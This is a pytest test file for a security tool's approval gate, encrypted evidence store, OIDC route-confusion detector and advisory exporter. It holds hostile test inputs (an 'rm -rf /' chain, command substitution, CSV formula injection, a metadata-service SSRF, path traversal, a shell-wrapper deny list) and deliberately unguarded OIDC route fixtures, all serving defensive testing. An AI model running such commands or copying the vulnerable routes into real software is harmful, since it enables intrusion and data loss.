"""
Tests for Pillars 3, 4, 5, and 6:
- ApprovalGate (`argv_prefix` strict matching, policy/prompt/deny modes, DB persistence)
- SecretBox & Database AES-256-GCM encryption at rest (and fail-closed on missing/wrong key)
- Durable `llm_usage` budget persistence & restoration across restarts
- `MANTIS-AUTH-011` OIDC service-route confusion detection across Python, Go, and TypeScript
- AdvisoryExporter: GHSA Markdown redaction, CSV formula neutralization, encrypted `.rfca` archives
- MCP new tools & Pure-CLI subcommands (`chains`, `traces`, `coverage`, `retest`, `export-advisory`, `archive`)
"""

from __future__ import annotations

import json
import os
import sqlite3
import subprocess
import sys
from pathlib import Path

import pytest

from database import Database
from engine.advisory_exporter import (
    AdvisoryExporter,
    neutralize_csv_cell,
    redact_sensitive_headers,
)
from engine.approval_gate import ApprovalGate, ApprovalRule, match_argv_prefix
from engine.dual_graph_engine import DualGraphAttackEngine
from engine.mantis_integrator import MantisIntegrator
from engine.secret_store import SecretBox
from mcp_server import TerminatorMCPServer


def test_approval_gate_argv_prefix_rules_modes_and_db_audit(tmp_path):
    # 1. Strict argv_prefix matching (pattern, command)
    assert match_argv_prefix(["git", "push"], "git push --force") is True
    assert match_argv_prefix(["git", "push"], "git -C /repo push") is False
    assert match_argv_prefix(["git", "push"], "git push | tee out.txt") is False
    assert match_argv_prefix(["git", "push"], "git push && rm -rf /") is False
    assert match_argv_prefix(["git", "push"], "git push $(whoami)") is False
    assert match_argv_prefix(["git", "push"], "sudo git push") is False
    assert match_argv_prefix(["git", "push"], "env git push") is False
    assert match_argv_prefix(["git", "push"], "sh -c 'git push'") is False

    # 2. Policy mode with explicit allow/deny rules + DB logging
    db = Database(":memory:")
    try:
        gate = ApprovalGate(
            mode="policy",
            rules=[
                ApprovalRule(rule_id="allow_git_status", rule_type="argv_prefix", pattern=["git", "status"], action="APPROVE"),
                ApprovalRule(rule_id="deny_delete", rule_type="http_method", pattern="DELETE", action="DENY"),
            ],
            db=db,
        )
        d1 = gate.check(action_type="subprocess", target="git status --short", command="git status --short", is_high_risk=True)
        assert d1.approved is True
        assert d1.rule_id == "allow_git_status"

        d2 = gate.check(action_type="network_socket", target="http://127.0.0.1/items/1", method="DELETE", is_high_risk=True)
        assert d2.approved is False
        assert d2.rule_id == "deny_delete"

        # 3. Deny mode blocks all high-risk actions
        deny_gate = ApprovalGate(mode="deny", db=db)
        with pytest.raises(PermissionError):
            deny_gate.require(action_type="network_socket", target="http://127.0.0.1/x", method="PUT", is_high_risk=True)

        # 4. Prompt mode with simulated [a]llow, [r]emember, and [d]eny
        answers = iter(["a", "r", "d"])
        prompt_gate = ApprovalGate(mode="prompt", db=db, input_fn=lambda _: next(answers), output_fn=lambda _: None)
        p1 = prompt_gate.check(action_type="network_socket", target="http://127.0.0.1/a", method="POST", is_high_risk=True)
        assert p1.approved is True
        p2 = prompt_gate.check(action_type="network_socket", target="http://127.0.0.1/b", method="PATCH", is_high_risk=True)
        assert p2.approved is True
        # Remembered rule allows subsequent matching call without consuming another prompt answer
        p2_repeat = prompt_gate.check(action_type="network_socket", target="http://127.0.0.1/b", method="PATCH", is_high_risk=True)
        assert p2_repeat.approved is True
        p3 = prompt_gate.check(action_type="network_socket", target="http://127.0.0.1/c", method="DELETE", is_high_risk=True)
        assert p3.approved is False

        # Verify audit persistence in SQLite
        history = db.get_approval_decisions(limit=50)
        assert len(history) >= 6
    finally:
        db.close()


def test_secret_box_and_database_encryption_at_rest_fail_closed(tmp_path):
    db_path = tmp_path / "encrypted.db"
    key_path = tmp_path / "keys" / "secret.key"

    # 1. Write sensitive chain + traffic evidence into on-disk encrypted DB
    db = Database(str(db_path), secret_key_path=str(key_path))
    try:
        assert key_path.is_file()
        assert db.secret_box is not None
        db.save_attack_chain(
            chain_id="CHAIN-ENC-001",
            title="Encrypted Auth Boundary Chain",
            attack_type="AUTH_BOUNDARY_CHAIN",
            target_host="127.0.0.1",
            target_endpoint="/internal/service",
            steps=[{"step": 1, "desc": "Captured private token response"}],
            raw_payload="SUPER-SECRET-PAYLOAD-TOKEN-XYZ",
            is_verified=True,
            task_id="TASK-ENC",
            poe_level=3,
            evidence_quote="secret-quote-xyz",
            traffic_id="TRF-ENC-001",
        )
        db.save_traffic_evidence(
            traffic_id="TRF-ENC-001",
            task_id="TASK-ENC",
            method="GET",
            url="http://127.0.0.1:8080/internal/service",
            host="127.0.0.1",
            port=8080,
            request_headers={"Authorization": "Bearer ULTRA-SENSITIVE-JWT-999"},
            status_code=200,
            response_headers={"Set-Cookie": "sid=SECRETCOOKIE123"},
            response_body_b64="eyJzZWNyZXQiOiJ2YWx1ZSJ9",
        )
    finally:
        db.close()

    # 2. Verify raw SQLite bytes on disk are AES-256-GCM encrypted (`enc:v1:`)
    raw_conn = sqlite3.connect(str(db_path))
    try:
        raw_payload = raw_conn.execute("SELECT raw_payload FROM attack_chains WHERE chain_id = 'CHAIN-ENC-001'").fetchone()[0]
        raw_hdrs = raw_conn.execute("SELECT request_headers_json FROM traffic_evidence WHERE traffic_id = 'TRF-ENC-001'").fetchone()[0]
        assert raw_payload.startswith("enc:v1:")
        assert "SUPER-SECRET-PAYLOAD-TOKEN-XYZ" not in raw_payload
        assert raw_hdrs.startswith("enc:v1:")
        assert "ULTRA-SENSITIVE-JWT-999" not in raw_hdrs
    finally:
        raw_conn.close()

    # 3. Verify clean decryption on reopen with valid key
    db2 = Database(str(db_path), secret_key_path=str(key_path))
    try:
        chains = db2.get_attack_chains(task_id="TASK-ENC")
        assert len(chains) == 1
        assert chains[0]["raw_payload"] == "SUPER-SECRET-PAYLOAD-TOKEN-XYZ"
        trec = db2.get_traffic_evidence("TRF-ENC-001")
        assert trec["request_headers"]["Authorization"] == "Bearer ULTRA-SENSITIVE-JWT-999"
    finally:
        db2.close()

    # 4. Verify fail-closed rejection when reopening encrypted DB without key or with wrong key
    wrong_key = tmp_path / "wrong.key"
    wrong_key.write_text(SecretBox.generate_key().hex(), encoding="utf-8")
    with pytest.raises(RuntimeError):
        Database(str(db_path), encrypt_at_rest=False)
    with pytest.raises(RuntimeError):
        Database(str(db_path), secret_key_path=str(wrong_key))

    # 5. Tamper detection on SecretBox directly
    box = SecretBox(SecretBox.generate_key())
    ct = box.encrypt_str("hello world")
    tampered = ct[:-4] + ("AAAA" if ct[-4:] != "AAAA" else "BBBB")
    with pytest.raises(Exception):
        box.decrypt_str(tampered)


def test_durable_llm_usage_budget_restoration_across_restarts(tmp_path):
    db_path = tmp_path / "budget.db"
    key_path = tmp_path / "secret.key"

    db1 = Database(str(db_path), secret_key_path=str(key_path))
    try:
        db1.record_llm_usage("TASK-BUDGET-1", role="planner", model="gemma4", prompt_tokens=300, completion_tokens=200, turns=2)
        db1.record_llm_usage("TASK-BUDGET-1", role="worker", model="gemma4", prompt_tokens=250, completion_tokens=150, turns=3)
    finally:
        db1.close()

    db2 = Database(str(db_path), secret_key_path=str(key_path))
    try:
        eng = DualGraphAttackEngine(
            db=db2,
            reports_dir=tmp_path / "reports",
            task_id="TASK-BUDGET-1",
            max_task_tokens=1000,
            max_task_turns=10,
        )
        snap = eng.budget_ledger.snapshot()
        assert snap["used_tokens"] == 900
        assert snap["used_turns"] == 5
        # 900/1000 leaves 100 <= wrap_up_reserve_tokens (150)
        assert snap["in_wrap_up"] is True
    finally:
        db2.close()


def test_mantis_auth_011_detects_oidc_service_route_confusion_python_go_ts(tmp_path, monkeypatch):
    monkeypatch.setenv("RFCHUNT_OFFLINE", "1")
    repo = tmp_path / "sample_repo"
    repo.mkdir()

    # Vulnerable Python service route accepting generic OIDC token without caller-type/aud guard
    (repo / "vuln_routes.py").write_text(
        '''
from fastapi import FastAPI, Header
app = FastAPI()

@app.post("/internal/service/dispatch")
def dispatch_job(authorization: str = Header(...)):
    claims = verify_oidc_token(authorization)
    return {"ok": True, "sub": claims["sub"]}
''',
        encoding="utf-8",
    )

    # Properly guarded Python service route (must NOT trigger MANTIS-AUTH-011)
    (repo / "safe_routes.py").write_text(
        '''
from fastapi import FastAPI, Header
app = FastAPI()

@app.post("/internal/service/safe")
def safe_job(authorization: str = Header(...)):
    claims = verify_oidc_token(authorization)
    if claims.get("caller_type") != "service_account" or not verify_service_token(authorization):
        raise PermissionError("service principal required")
    return {"ok": True}
''',
        encoding="utf-8",
    )

    # Vulnerable Go handler
    (repo / "service.go").write_text(
        '''
package server
import "net/http"
func RegisterRoutes(mux *http.ServeMux) {
    mux.HandleFunc("/internal/governance/execute", func(w http.ResponseWriter, r *http.Request) {
        claims, err := verifyOIDC(r.Header.Get("Authorization"))
        if err != nil { w.WriteHeader(401); return }
        _ = claims
        w.WriteHeader(200)
    })
}
''',
        encoding="utf-8",
    )

    # Vulnerable TypeScript Express handler
    (repo / "admin.ts").write_text(
        '''
export function mountAdmin(router: any) {
  router.post("/service/worker/run", async (req: any, res: any) => {
    const user = await verifyIdToken(req.headers.authorization);
    return res.json({ ok: true, user });
  });
}
''',
        encoding="utf-8",
    )

    db = Database(":memory:")
    try:
        integrator = MantisIntegrator(db=db, reports_dir=str(tmp_path / "reports"), use_fusion=True)
        res = integrator.run_scan(target_path=str(repo), depth=100, mode="scan")
        auth011 = [f for f in res["findings"] if f["rule_id"] == "MANTIS-AUTH-011"]
        matched_files = {Path(f["file_path"]).name for f in auth011}
        assert "vuln_routes.py" in matched_files
        assert "service.go" in matched_files
        assert "admin.ts" in matched_files
        assert "safe_routes.py" not in matched_files
        for f in auth011:
            if Path(f["file_path"]).name in ("service.go", "admin.ts"):
                assert f["reproduced"] is True
                assert "TIER_1" in str(f["reproduction_tier"])
                assert f["cvss_score"] >= 7.0
                assert f["severity"] in ("HIGH", "CRITICAL")
    finally:
        db.close()


def test_advisory_exporter_ghsa_csv_neutralization_and_encrypted_archive(tmp_path):
    # 1. Formula neutralization
    assert neutralize_csv_cell("=CMD|' /C calc'!A0") == "'=CMD|' /C calc'!A0"
    assert neutralize_csv_cell("+1+1") == "'+1+1"
    assert neutralize_csv_cell("-2+3") == "'-2+3"
    assert neutralize_csv_cell("@SUM(A1:A5)") == "'@SUM(A1:A5)"
    assert neutralize_csv_cell("\t=1+1") == "'\t=1+1"
    assert neutralize_csv_cell("normal text") == "normal text"

    # 2. Header redaction
    redacted = redact_sensitive_headers(
        {
            "Authorization": "Bearer super-secret-oidc-jwt",
            "Cookie": "session=xyz987; theme=dark",
            "X-Api-Key": "sk-live-secret",
            "Host": "api.example.com",
        }
    )
    assert redacted["Authorization"] == "Bearer <REDACTED>"
    assert "xyz987" not in redacted["Cookie"]
    assert "session=<REDACTED>" in redacted["Cookie"]
    assert redacted["X-Api-Key"] == "<REDACTED>"
    assert redacted["Host"] == "api.example.com"

    # 3. GHSA Markdown + CSV + Encrypted `.rfca` Archive round-trip
    db_path = tmp_path / "exp.db"
    key_path = tmp_path / "secret.key"
    db = Database(str(db_path), secret_key_path=str(key_path))
    try:
        db.save_attack_chain(
            chain_id="CHAIN-GHSA-1",
            title="End-User OIDC Token Accepted on Service-Only Route",
            attack_type="AUTH_BOUNDARY_DIRECT",
            target_host="api.example.local",
            target_endpoint="/internal/service",
            steps=[{"step": 1, "capability": "AUTH_BOUNDARY", "desc": "End-user OIDC token accepted on service-only route"}],
            raw_payload="GET /internal/service",
            is_verified=True,
            task_id="TASK-EXP",
            poe_level=3,
            evidence_quote='{"scope":"governance-admin"}',
            traffic_id="TRF-EXP-1",
        )
        db.save_traffic_evidence(
            traffic_id="TRF-EXP-1",
            task_id="TASK-EXP",
            method="GET",
            url="https://api.example.local/internal/service",
            host="api.example.local",
            port=443,
            request_headers={"Authorization": "Bearer DO-NOT-LEAK-TOKEN-777", "Accept": "application/json"},
            status_code=200,
            response_headers={"Content-Type": "application/json"},
            response_body_b64="eyJzY29wZSI6ImdvdmVybmFuY2UtYWRtaW4ifQ==",
        )
        db.save_chain_retest(
            retest_id="RT-1",
            chain_id="CHAIN-GHSA-1",
            verdict="FIXED",
            evidence="Server now returns HTTP 403",
            traffic_id="TRF-EXP-2",
        )

        exporter = AdvisoryExporter(reports_dir=tmp_path / "reports")
        chain = db.get_attack_chains(task_id="TASK-EXP")[0]
        trec = db.get_traffic_evidence("TRF-EXP-1")
        rtests = db.get_chain_retests(chain_id="CHAIN-GHSA-1")

        md_path = tmp_path / "reports" / "CHAIN-GHSA-1.md"
        md = exporter.export_ghsa_markdown(chain, traffic_record=trec, retests=rtests, output_path=md_path)
        assert md_path.is_file()
        assert "Bearer <REDACTED>" in md
        assert "DO-NOT-LEAK-TOKEN-777" not in md
        assert "POE=3 (VERIFIED_EXPLOIT)" in md
        assert "FIXED" in md

        csv_path = tmp_path / "reports" / "findings.csv"
        csv_text = exporter.export_findings_csv(
            [{"finding_id": "F1", "rule_id": "MANTIS-AUTH-011", "title": "=HYPERLINK(\"http://evil\")", "severity": "HIGH"}],
            chains=[chain],
            output_path=csv_path,
        )
        assert csv_path.is_file()
        assert "'=HYPERLINK" in csv_text

        arc_path = tmp_path / "reports" / "task.rfca"
        arc_meta = exporter.export_task_archive(db, arc_path, task_id="TASK-EXP")
        assert arc_meta["encrypted"] is True
        raw_bytes = arc_path.read_bytes()
        assert raw_bytes.startswith(b"RFCA1")
        assert b"DO-NOT-LEAK-TOKEN-777" not in raw_bytes

        imported = AdvisoryExporter.import_task_archive(arc_path, secret_box=db.secret_box)
        assert imported["verified"] is True
        assert imported["sha256"] == arc_meta["sha256"]
        assert len(imported["payload"]["attack_chains"]) == 1

        # Tampering 1 byte of encrypted archive must fail closed
        bad_arc = tmp_path / "reports" / "tampered.rfca"
        corrupted = bytearray(raw_bytes)
        corrupted[-1] ^= 0xFF
        bad_arc.write_bytes(bytes(corrupted))
        with pytest.raises(Exception):
            AdvisoryExporter.import_task_archive(bad_arc, secret_box=db.secret_box)
    finally:
        db.close()


def test_mcp_new_tools_and_pure_cli_subcommands_end_to_end(tmp_path):
    db_path = tmp_path / "cli_mcp.db"
    os.environ["ARTEX_SECRET_KEY"] = SecretBox.generate_key().hex()
    try:
        db = Database(str(db_path))
        try:
            db.save_dual_graph_node("ASSET-1", "ASSET", "ENDPOINT", "GET /internal/service", {"host": "127.0.0.1"})
            db.save_dual_graph_node("EXP-1", "EXPLORATION", "CONFIRMED_EXPLOIT", "OIDC Bypass", {"poe_level": 3})
            db.save_exploration_anchor("EXP-1", "ASSET-1", task_id="TASK-CLI")
            db.save_attack_chain(
                chain_id="CHAIN-CLI-1",
                title="OIDC Auth Boundary Direct",
                attack_type="AUTH_BOUNDARY_DIRECT",
                target_host="127.0.0.1",
                target_endpoint="/internal/service",
                steps=[{"step": 1, "capability": "AUTH_BOUNDARY", "desc": "Confirmed"}],
                raw_payload="GET /internal/service",
                is_verified=True,
                task_id="TASK-CLI",
                poe_level=3,
                evidence_quote="granted",
                traffic_id="TRF-CLI-1",
            )
            db.save_traffic_evidence(
                traffic_id="TRF-CLI-1",
                task_id="TASK-CLI",
                method="GET",
                url="http://127.0.0.1:8080/internal/service",
                host="127.0.0.1",
                port=8080,
                status_code=200,
                response_body_b64="Z3JhbnRlZA==",
            )
            db.save_worker_trace(
                trace_id="TR-CLI-1",
                task_id="TASK-CLI",
                worker_id="artex-worker-1",
                intent_id="CAND-1",
                tool_name="AUTH_BOUNDARY_DIRECT",
                target_asset_id="ASSET-1",
                status="VERIFIED",
                summary="Live auth boundary confirmed",
                raw_observation="granted",
            )
            db.record_llm_usage("TASK-CLI", role="planner", model="gemma4", prompt_tokens=100, completion_tokens=50, turns=1)
            db.save_approval_decision(
                action_type="network_socket",
                decision="APPROVE",
                decided_by="policy",
                task_id="TASK-CLI",
                target="http://127.0.0.1/internal/service",
                method="GET",
                rule_id="policy_auto_allow",
            )
        finally:
            db.close()

        # 1. Test 4 new MCP tools directly
        with TerminatorMCPServer(db_path=str(db_path)) as srv:
            tool_names = {t["name"] for t in srv._get_tool_definitions()}
            assert {"artex_import_surface", "artex_export_advisory", "artex_approval_history", "artex_budget_status"} <= tool_names

            r_hist = srv.handle_request({"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": "artex_approval_history", "arguments": {"limit": 10}}})
            hist_data = json.loads(r_hist["result"]["content"][0]["text"])
            assert hist_data["count"] >= 1

            r_bud = srv.handle_request({"jsonrpc": "2.0", "id": 2, "method": "tools/call", "params": {"name": "artex_budget_status", "arguments": {"task_id": "TASK-CLI"}}})
            bud_data = json.loads(r_bud["result"]["content"][0]["text"])
            assert bud_data["usage"]["total_tokens"] == 150

            r_exp = srv.handle_request({
                "jsonrpc": "2.0",
                "id": 3,
                "method": "tools/call",
                "params": {
                    "name": "artex_export_advisory",
                    "arguments": {
                        "chain_id": "CHAIN-CLI-1",
                        "output_dir": str(tmp_path / "mcp_adv"),
                        "export_csv": True,
                        "archive_path": str(tmp_path / "mcp_adv" / "mcp.rfca"),
                    },
                },
            })
            exp_data = json.loads(r_exp["result"]["content"][0]["text"])
            assert exp_data["advisories_exported"] == 1
            assert Path(exp_data["csv_path"]).is_file()
            assert Path(exp_data["archive"]["path"]).is_file()

        # 2. Test pure-CLI subcommands via subprocess
        env = {**os.environ, "RFCHUNT_OFFLINE": "1"}
        root = str(Path(__file__).resolve().parent.parent)

        def _run_cli(*cli_args):
            proc = subprocess.run(
                [sys.executable, "main.py", *cli_args],
                cwd=root,
                env=env,
                capture_output=True,
                text=True,
                timeout=30,
            )
            assert proc.returncode == 0, f"CLI failed ({cli_args}): {proc.stderr}\n{proc.stdout}"
            return json.loads(proc.stdout)

        chains_out = _run_cli("chains", "--db", str(db_path), "--min-poe", "3", "--verified-only", "--json")
        assert len(chains_out) == 1 and chains_out[0]["chain_id"] == "CHAIN-CLI-1"

        traces_out = _run_cli("traces", "--db", str(db_path), "--query", "auth boundary", "--json")
        assert len(traces_out) == 1 and traces_out[0]["trace_id"] == "TR-CLI-1"

        cov_out = _run_cli("coverage", "--db", str(db_path), "--json")
        assert cov_out["tested_assets"] == 1 and cov_out["coverage_pct"] == 100.0

        retest_out = _run_cli("retest", "--db", str(db_path), "--chain-id", "CHAIN-CLI-1", "--json")
        assert len(retest_out) == 1 and retest_out[0]["verdict"] == "STILL_REPRODUCIBLE"

        adv_out = _run_cli("export-advisory", "--db", str(db_path), "--out", str(tmp_path / "cli_adv"), "--csv", "--json")
        assert adv_out["Advisories Exported"] == 1
        assert Path(adv_out["CSV Exported"]).is_file()

        arc_file = str(tmp_path / "cli_backup.rfca")
        arc_exp = _run_cli("archive", "--db", str(db_path), "--export", arc_file, "--task-id", "TASK-CLI", "--json")
        assert arc_exp["encrypted"] is True
        arc_imp = _run_cli("archive", "--import", arc_file, "--json")
        assert arc_imp["Verified"] is True and arc_imp["Chains"] == 1
    finally:
        os.environ.pop("ARTEX_SECRET_KEY", None)


def test_approval_gate_hard_execution_policy_precedence_and_schema_migrations(tmp_path):
    from engine.execution_policy import ExecutionPolicy, validate_llm_json_response

    db_path = tmp_path / "mig.db"
    db = Database(str(db_path))
    try:
        # 1. Verify schema_migrations populated
        migs = {r[0] for r in db.conn.execute("SELECT version FROM schema_migrations").fetchall()}
        assert {
            "001_attack_chains_artex_cols",
            "002_chain_retests_original_traffic_id",
            "003_approval_decisions_action_summary",
        } <= migs

        # 2. Hard ExecutionPolicy precedence cannot be bypassed by APPROVE rules
        gate = ApprovalGate(
            mode="policy",
            rules=[
                ApprovalRule(rule_id="allow_meta", rule_type="exact_host", pattern="169.254.169.254", action="APPROVE"),
                ApprovalRule(rule_id="allow_curl", rule_type="argv_prefix", pattern=["curl"], action="APPROVE"),
                ApprovalRule(rule_id="allow_loopback", rule_type="exact_host", pattern="127.0.0.1", action="APPROVE"),
            ],
            db=db,
        )
        d_ssrf = gate.check(action_type="network_socket", target="http://169.254.169.254/latest/meta-data", method="GET", is_high_risk=False)
        assert d_ssrf.approved is False
        assert d_ssrf.rule_id == "EXECUTION_POLICY_HARD_DENY"

        d_shell = gate.check(action_type="subprocess", target="curl http://127.0.0.1", command="curl http://127.0.0.1", is_high_risk=True)
        assert d_shell.approved is False
        assert d_shell.rule_id == "EXECUTION_POLICY_HARD_DENY"

        d_trav = gate.check(action_type="file_write", target="../../etc/passwd", is_high_risk=True)
        assert d_trav.approved is False
        assert d_trav.rule_id == "EXECUTION_POLICY_HARD_DENY"

        # 3. exact_host matches URL hostname
        d_ok = gate.check(action_type="network_socket", target="http://127.0.0.1:8080/internal/service", method="DELETE", is_high_risk=True)
        assert d_ok.approved is True
        assert d_ok.rule_id == "allow_loopback"

        # 4. [q]uit in prompt mode switches gate to deny
        q_gate = ApprovalGate(mode="prompt", db=db, input_fn=lambda _: "q", output_fn=lambda _: None)
        d_q = q_gate.check(action_type="network_socket", target="http://127.0.0.1/x", method="POST", is_high_risk=True)
        assert d_q.approved is False
        assert q_gate.mode == "deny"

        # 5. action_summary persisted in approval_decisions
        rows = db.get_approval_decisions(limit=10)
        assert any(r.get("action_summary") for r in rows)
    finally:
        ExecutionPolicy.reset_instance()
        db.close()

    # 6. validate_llm_json_response accepts both 'steps' and 'chain_steps' and preserves method
    ok_plan, clean_plan, _ = validate_llm_json_response(
        {
            "intents": [{
                "title": "Test intent",
                "attack_type": "AUTH_BOUNDARY",
                "target_route": "/internal/service",
                "method": "POST",
                "steps": [{"capability": "AUTH_BOUNDARY", "desc": "Probe token"}],
            }]
        },
        schema_type="artex_plan",
    )
    assert ok_plan is True
    assert clean_plan["intents"][0]["method"] == "POST"
    assert len(clean_plan["intents"][0]["chain_steps"]) == 1


def test_main_artex_rfc_hunt_swarm_subcommands_and_cli_render(tmp_path, monkeypatch):
    from engine import cli_render

    # 1. cli_render TTY vs plain fallback + LiveScanProgress + render_poe_summary
    monkeypatch.delenv("CI", raising=False)
    monkeypatch.delenv("NO_COLOR", raising=False)
    monkeypatch.setattr(sys.stdout, "isatty", lambda: True)
    assert cli_render._use_rich(plain=False) is True
    assert cli_render._use_rich(plain=True) is False
    with cli_render.LiveScanProgress("Test Scan", plain=True) as prog:
        prog.update("Planner", "DONE", "2 chains")
    cli_render.render_poe_summary({"VERIFIED_EXPLOIT": 1, "PASSIVE_CORRELATION": 1}, {"coverage_pct": 50.0}, plain=True)

    # 2. main.py artex with R5 flags & rfc_hunt_swarm.py subcommands
    db_path = tmp_path / "swarm_cli.db"
    oa_path = tmp_path / "oa.json"
    oa_path.write_text(json.dumps({"openapi": "3.0.3", "paths": {"/internal/service": {"get": {"summary": "Svc"}}}}), encoding="utf-8")
    env = {**os.environ, "RFCHUNT_OFFLINE": "1", "CI": "true"}
    root = str(Path(__file__).resolve().parent.parent)

    p_artex = subprocess.run(
        [
            sys.executable, "main.py", "artex",
            "--db", str(db_path),
            "--artex-workers", "2",
            "--no-artex-live",
            "--import-openapi", str(oa_path),
            "--output-dir", str(tmp_path / "artex_out"),
            "--export-advisory", "--export-csv", "--json",
        ],
        cwd=root, env=env, capture_output=True, text=True, timeout=30,
    )
    assert p_artex.returncode == 0, p_artex.stderr + p_artex.stdout
    artex_json = json.loads(p_artex.stdout)
    assert artex_json["result"]["candidates_planned"] >= 1

    for swarm_args in (
        ["chains", "--db", str(db_path), "--json"],
        ["traces", "--db", str(db_path), "--query", "DESYNC", "--json"],
        ["coverage", "--db", str(db_path), "--json"],
        ["retest", "--db", str(db_path), "--json"],
        ["export-advisory", "--db", str(db_path), "--out", str(tmp_path / "sw_adv"), "--csv", "--json"],
        ["proxy", "--db", str(db_path), "--port", "0", "--duration", "0.2", "--json"],
        ["archive", "--db", str(db_path), "--export", str(tmp_path / "sw.rfca"), "--json"],
        ["archive", "--import", str(tmp_path / "sw.rfca"), "--json"],
    ):
        proc = subprocess.run(
            [sys.executable, "rfc_hunt_swarm.py", *swarm_args],
            cwd=root, env=env, capture_output=True, text=True, timeout=30,
        )
        assert proc.returncode == 0, f"Swarm failed ({swarm_args}): {proc.stderr}\n{proc.stdout}"
        json.loads(proc.stdout)


def test_approval_gate_hardening_and_advisory_task_scoping(tmp_path):
    from engine.approval_gate import parse_simple_argv

    rules_file = tmp_path / "rules.json"
    rules_file.write_text(
        json.dumps([
            {
                "rule_id": "allow_get_local",
                "rule_type": "exact_host",
                "action": "APPROVE",
                "pattern": "127.0.0.1",
                "method_scope": "GET",
            }
        ]),
        encoding="utf-8",
    )
    gate = ApprovalGate.from_rules_file(rules_file, mode="policy")
    assert gate.rules[0].method_scope == "GET"
    assert gate.check(action_type="network_socket", target="http://127.0.0.1:8080/x", method="GET", is_high_risk=True).approved is True
    assert gate.check(action_type="network_socket", target="http://127.0.0.1:8080/x", method="POST", is_high_risk=True).approved is False

    # .exe wrappers & list token metacharacter rejection
    for exe_wrap in ("env.exe", "bash.exe", "timeout.exe", "xargs.exe", "powershell.exe", "pwsh.exe", "sh.exe"):
        assert parse_simple_argv([exe_wrap, "python", "--version"]) is None
        d_wrap = gate.check(action_type="subprocess", target=exe_wrap, command=[exe_wrap, "python"], is_high_risk=True)
        assert d_wrap.approved is False and d_wrap.rule_id == "EXECUTION_POLICY_HARD_DENY"

    for bad_tok in ("arg\nid", "arg\rid", "arg(x)", "arg)"):
        assert parse_simple_argv(["python", bad_tok]) is None
        d_tok = gate.check(action_type="subprocess", target="python", command=["python", bad_tok], is_high_risk=True)
        assert d_tok.approved is False and d_tok.rule_id == "EXECUTION_POLICY_HARD_DENY"

    # IP-like target SSRF rejection regardless of action_type
    d_custom = gate.check(action_type="custom_http", target="169.254.169.254", is_high_risk=False)
    assert d_custom.approved is False and d_custom.rule_id == "EXECUTION_POLICY_HARD_DENY"

    # Archive approval_decisions task_id isolation
    os.environ["ARTEX_SECRET_KEY"] = SecretBox.generate_key().hex()
    db = Database(str(tmp_path / "scope_arc.db"))
    try:
        db.save_approval_decision(action_type="network_socket", decision="APPROVE", decided_by="policy", task_id="T1", target="http://127.0.0.1/t1", method="GET")
        db.save_approval_decision(action_type="network_socket", decision="DENY", decided_by="policy", task_id="T2", target="http://127.0.0.1/t2", method="POST")
        arc_path = tmp_path / "t1.rfca"
        AdvisoryExporter(reports_dir=tmp_path).export_task_archive(db, arc_path, task_id="T1")
        unpacked = AdvisoryExporter.import_task_archive(arc_path, secret_box=db.secret_box)
        approvals = unpacked["payload"]["approval_decisions"]
        assert len(approvals) == 1
        assert approvals[0]["task_id"] == "T1"
    finally:
        db.close()
        os.environ.pop("ARTEX_SECRET_KEY", None)


def test_all_json_clean_stdout_and_rfc_hunt_swarm_openapi_autodiscovery(tmp_path):
    from test_lab_server import TestLabServer

    repo = tmp_path / "mini_repo"
    repo.mkdir()
    (repo / "app.py").write_text("def hello():\n    return 'ok'\n", encoding="utf-8")

    lab = TestLabServer(host="127.0.0.1", port=0)
    lab.start()
    try:
        spec = repo / "openapi.json"
        spec.write_text(
            json.dumps({
                "openapi": "3.0.3",
                "servers": [{"url": f"http://127.0.0.1:{lab.port}"}],
                "paths": {"/internal/service": {"get": {"summary": "Svc"}}},
            }),
            encoding="utf-8",
        )
        root = str(Path(__file__).resolve().parent.parent)
        env = {**os.environ, "RFCHUNT_OFFLINE": "1", "CI": "true"}

        p1 = subprocess.run(
            [
                sys.executable, "main.py", "--all",
                "--repo", str(repo),
                "--db", str(tmp_path / "main_all.db"),
                "--output-dir", str(tmp_path / "out1"),
                "--no-artex-live", "--json",
            ],
            cwd=root, env=env, capture_output=True, text=True, timeout=60,
        )
        assert p1.returncode == 0, p1.stderr + p1.stdout
        d1 = json.loads(p1.stdout)
        assert "attack_chaining" in d1

        p2 = subprocess.run(
            [
                sys.executable, "rfc_hunt_swarm.py", "all",
                "--repo", str(repo),
                "--db", str(tmp_path / "swarm_all.db"),
                "--output-dir", str(tmp_path / "out2"),
                "--import-openapi", str(spec),
                "--no-artex-live", "--json",
            ],
            cwd=root, env=env, capture_output=True, text=True, timeout=60,
        )
        assert p2.returncode == 0, p2.stderr + p2.stdout
        d2 = json.loads(p2.stdout)
        assert d2["remote_executed"] is True
        assert d2["remote_target"] == f"127.0.0.1:{lab.port}"
    finally:
        lab.stop()


def test_cli_pagination_over_60_chains_120_traces_and_missing_chain_id_exit_code(tmp_path):
    db_path = tmp_path / "paginated.db"
    os.environ["ARTEX_SECRET_KEY"] = SecretBox.generate_key().hex()
    try:
        db = Database(str(db_path))
        try:
            db.save_attack_chain(
                chain_id="CHAIN-OLD-TARGET-001",
                title="Old Target Chain",
                attack_type="AUTH_BOUNDARY_DIRECT",
                target_host="127.0.0.1",
                target_endpoint="/internal/service",
                steps=[{"step": 1, "capability": "AUTH_BOUNDARY", "desc": "Old target"}],
                raw_payload="GET /internal/service",
                is_verified=True,
                task_id="TASK-PAG",
                poe_level=3,
                evidence_quote="granted",
            )
            db.conn.execute("UPDATE attack_chains SET created_at = '2020-01-01 00:00:00' WHERE chain_id = 'CHAIN-OLD-TARGET-001'")
            for i in range(65):
                cid = f"CHAIN-NEW-{i:03d}"
                db.save_attack_chain(
                    chain_id=cid,
                    title=f"Newer Chain {i}",
                    attack_type="PIPELINE_HIJACK",
                    target_host="127.0.0.1",
                    target_endpoint="/",
                    steps=[{"step": 1, "capability": "DESYNC"}],
                    raw_payload="GET /",
                    is_verified=False,
                    task_id="TASK-PAG",
                    poe_level=1,
                )
            db.conn.execute("UPDATE attack_chains SET created_at = '2026-01-01 00:00:00' WHERE chain_id LIKE 'CHAIN-NEW-%'")

            db.save_worker_trace(
                trace_id="TR-OLD-AUTH-001",
                task_id="TASK-PAG",
                worker_id="w1",
                intent_id="CAND-OLD",
                tool_name="AUTH_BOUNDARY",
                target_asset_id="A1",
                status="COMPLETED",
                summary="AUTH_BOUNDARY match",
                raw_observation="confirmed",
            )
            db.conn.execute("UPDATE worker_execution_traces SET created_at = '2020-01-01 00:00:00' WHERE trace_id = 'TR-OLD-AUTH-001'")
            for i in range(125):
